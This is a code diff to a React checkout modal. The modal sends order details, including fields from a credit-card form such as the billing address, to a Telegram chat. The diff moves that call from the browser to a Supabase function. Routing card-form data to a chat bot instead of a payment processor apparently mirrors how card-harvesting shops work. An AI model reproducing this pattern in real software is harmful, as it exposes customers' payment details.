@@ -8,6 +8,7 @@ import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/u
 import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
 import { CreditCard, Smartphone, DollarSign, Building, Upload, X } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
+import { supabase } from "@/integrations/supabase/client";
 
 
 interface CheckoutModalProps {
@@ -76,9 +77,6 @@ const CheckoutModal = ({ isOpen, onClose, total, currency, cartItems }: Checkout
     setIsProcessing(true);
 
     try {
-      const BOT_TOKEN = import.meta.env.VITE_TELEGRAM_BOT_TOKEN;
-      const CHAT_ID = import.meta.env.VITE_TELEGRAM_CHAT_ID;
-
       const message = `🛒 *NEW CHECKOUT ORDER*\n\n` +
         `💳 Payment Method: ${selectedPaymentMethod.toUpperCase()}\n` +
         `💰 Total: $${total.toFixed(2)} ${currency}\n` +
@@ -92,15 +90,20 @@ const CheckoutModal = ({ isOpen, onClose, total, currency, cartItems }: Checkout
           `Address: ${creditCardForm.billingAddress}, ${creditCardForm.city}, ${creditCardForm.postalCode}, ${creditCardForm.country}`
           : '');
 
-      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: CHAT_ID,
-          text: message,
-          parse_mode: 'Markdown'
-        })
+      const { error: tgError } = await supabase.functions.invoke("send-telegram-notification", {
+        body: { message, type: "checkout" },
       });
+
+      if (tgError) {
+        console.error('Telegram notify error:', tgError);
+        toast({
+          title: "Order Could Not Be Submitted",
+          description: "We couldn't send your order right now. Please try again in a moment.",
+          variant: "destructive",
+        });
+        setIsProcessing(false);
+        return;
+      }
 
       toast({
         title: "Order Placed Successfully!",
